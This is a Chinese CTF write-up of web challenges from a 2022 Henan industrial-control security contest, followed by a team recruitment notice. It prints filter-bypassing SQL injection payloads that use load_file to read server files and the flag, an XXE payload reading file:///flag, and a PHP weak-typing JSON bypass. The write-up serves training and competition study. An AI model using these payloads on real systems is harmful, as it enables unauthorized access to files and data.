# 2022IS河南工业控制安全部分web题解

> 原文: https://www.ctfiot.com/90304.html
> ID: 90304

作者：天权信安网络安全团队

Headlight

HNGK-兰亭集序

01

web兰亭集序

02

HNGK-out

恢复正常，说明闭合符号是’

然后先判断下表格的列数是多少，输入id=1’order by 1%23,

发现还报错，但是报错信息改变了，没有or，猜想是or不能连用，于是继续改变order为O rder，提交，

终于正常了。

然后判断列数为3，

联合查询数据库，?id=1’union/**/select/**/1,2,database()%23

报错，发现是select被过滤了，

成功！

接下来使用下列命令查询数据库中的数据，

1,查询数据库

?id=-1’union/**/seselectlect/**/1,2,group_concat(schema_name)/**/from/**/infO rmation_schema.schemata%23

注意：or之间要加个空格，否则会被过滤

2，查表名

?id=-1’union/**/seselectlect/**/1,2,group_concat(table_name)/**/from/**/infO rmation_schema.tables/**/where/**/table_schema=’security’%23

3，查字段

?id=-1’union/**/seselectlect/**/1,2,group_concat(column_name)/**/from/**/infO rmation_schema.columns/**/where/**/table_name=’emails’%23

4，查数据值，

?id=-1’union/**/seselectlect/**/1,2,group_concat(id,email_id)/**/from/**/security.emails%23

按照上述方法将security中所有数据看一遍，发现没有flag………….

猜想是非预期，于是提交，

?id=-1’unioN/**/sselectelect/**/1,load_file(“/var/www/html/index.php”),3/**/%23

证明是非预期，最终在根目录下发现flag，

?id=-1’unioN/**/sselectelect/**/1,load_file(“/flag”),3/**/%23

03

HNGK-xxx

尝试了几下以为是sql注入，结果登录点不动，sql注入尝试失败，继续点开源代码查看

经典xxe，我直接向doLogin.php

发包，利用经典协议流

<?xml version=”1.0″ encoding=”UTF-8″?>

<!DOCTYPE any [

<!ENTITY xxe SYSTEM “file:///flag” >]>

&xxe;111

在包里填充发送，flag一把哈出来了

04

HNGK-phpgame

一眼丁真代码审计

首先就是先知道json传参的形式

接下来开始绕过函数分析

year”:”2022a”绕过$info[“year”]=2022)

“items”:[]绕过is_array(@$info[“items”])

“items”:[“0”,[“a”],”g”] 绕过 !is_array($info[“items”][1])OR count($info[“items”])!==3

0绕过array_search(“game”, $info[“items”])，用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比较。

最后构建payload：

?get={“year”:”2022a”,”items”:[0,[“a”],”g”]}

完

招新小广告

2023年招新计划(主力/NMEGREZ)

注：不限年龄与职业要求，只要不是纯小白(或者是初学者未参与过任何一场比赛的人)就有机会通过审核，天权信安对外长期招新，出色的师傅能够参与团队项目和竞赛项目建设。

PWN：要求技术中等偏上（曾参与过省级/国家级网安赛事荣获过奖项的师傅优先考虑）

REVERSE：要求技术中等（曾参与过省级/国家级网安赛事荣获过奖项的师傅优先考虑）

CRYPTO：要求技术中等偏上

WEB：要求技术中等偏上

取证：曾参与过省级网安取证赛事荣获过奖项的师傅

BLOCKCHAIN/IOT/工控/AI：要求技术中等

CTF竞赛靶场/TQCTF练习平台运维师傅：若干名，熟悉docker操作、动态题目部署、以及常规运维，还具备组网部署经验和Linux、Windows系统部署和日常维护，能使靶场平台在各种环境中正常运行。

 欢迎联系：

投递邮箱：megrez@megrezsec.cn（Evan师傅）

–天权信安网络安全团队–

网络无边 安全有界

2022，感恩有您

2023，携手同行

用技术撬动未来，用奋斗描绘成功！

---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/6-1673004986.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/2-1673004988.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/3-1673004988.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/1-1673004989.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/0-1673004989.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/5-1673004989.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/10-1673004990.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/4-1673004990.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/2-1673004991.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/10-1673004992.png)